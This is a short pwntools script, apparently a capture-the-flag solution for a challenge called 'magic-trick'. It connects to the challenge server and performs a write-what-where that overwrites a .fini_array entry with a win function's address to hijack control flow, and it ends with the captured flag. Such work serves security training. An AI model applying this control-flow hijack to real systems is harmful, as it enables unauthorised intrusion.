#!/usr/bin/env python

from pwn import *

win = 0x400667
fini = 0x600a00

p = remote('dctf-chall-magic-trick.westeurope.azurecontainer.io', 7481)

# What are we writing?
p.recvuntil("write\n")
p.sendline(str(win))
# Where are we writing it to?
p.recvuntil("write it\n")
p.sendline(str(fini))
p.interactive()

"""
thanks
You are a real magician
dctf{1_L1k3_M4G1c}
"""